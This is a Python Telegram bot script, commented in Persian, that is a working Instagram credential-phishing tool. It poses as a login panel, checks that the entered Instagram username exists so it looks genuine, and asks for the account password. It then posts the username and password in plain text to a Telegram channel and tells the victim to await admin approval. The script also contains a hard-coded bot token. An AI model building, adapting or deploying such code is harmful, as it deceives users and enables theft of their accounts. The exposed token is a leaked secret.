import telebot
from telebot import types
import instaloader

# تنظیمات
TOKEN = "8261955496:AAEFnh4gvZ6tvfOa4eJL9U49UcouXtRMlCU"
CHANNEL_ID = "@tedifank"

bot = telebot.TeleBot(TOKEN)
L = instaloader.Instaloader()
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🌐 ورود به پنل کاربری", callback_data="login_process")
    markup.add(btn)
    bot.send_message(message.chat.id, "👋 خوش آمدید! برای شروع روی دکمه زیر کلیک کنید:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "login_process")
def ask_username(call):
    msg = bot.send_message(call.message.chat.id, "👤 نام کاربری (Username) اینستاگرام را وارد کنید:")
    bot.register_next_step_handler(msg, check_username)

def check_username(message):
    chat_id = message.chat.id
    username = message.text.replace("@", "").strip() # حذف @ احتمالی
    
    wait_msg = bot.send_message(chat_id, "🔍 در حال استعلام نام کاربری از دیتابیس اینستاگرام...")
    
    try:
        # بررسی وجود یوزرنیم در اینستاگرام
        profile = instaloader.Profile.from_username(L.context, username)
        
        # اگر یوزرنیم وجود داشت
        user_data[chat_id] = {'username': username}
        bot.delete_message(chat_id, wait_msg.message_id)
        
        info_text = (
            f"✅ اکانت یافت شد!\n"
            f"👤 نام: {profile.full_name}\n"
            f"👥 فالوور: {profile.followers}\n\n"
            f"🔐 برای اتصال، **رمز عبور** اکانت را وارد کنید:"
        )
        msg = bot.send_message(chat_id, info_text)
        bot.register_next_step_handler(msg, save_password_and_send)
        
    except instaloader.exceptions.ProfileNotExistsException:
        bot.edit_message_text("❌ خطا: این نام کاربری در اینستاگرام وجود ندارد. دوباره تلاش کنید:", chat_id, wait_msg.message_id)
        bot.register_next_step_handler(message, check_username)
    except Exception as e:
        bot.edit_message_text("⚠️ سرور شلوغ است. لطفا نام کاربری را دوباره بفرستید:", chat_id, wait_msg.message_id)
        bot.register_next_step_handler(message, check_username)

def save_password_and_send(message):
    chat_id = message.chat.id
    password = message.text
    username = user_data[chat_id]['username']
    
    report = (
        "📥 **اطلاعات تایید شده دریافت شد**\n"
        "━━━━━━━━━━━━━━\n"
        f"👤 یوزرنیم: `@{username}`\n"
        f"🔑 پسورد: `{password}`\n"
        "━━━━━━━━━━━━━━"
    )
    
    bot.send_message(CHANNEL_ID, report, parse_mode="Markdown")
    bot.send_message(chat_id, "✅ اطلاعات با موفقیت ثبت شد. منتظر تایید مدیریت باشید.")
    
    if chat_id in user_data:
        del user_data[chat_id]

bot.polling()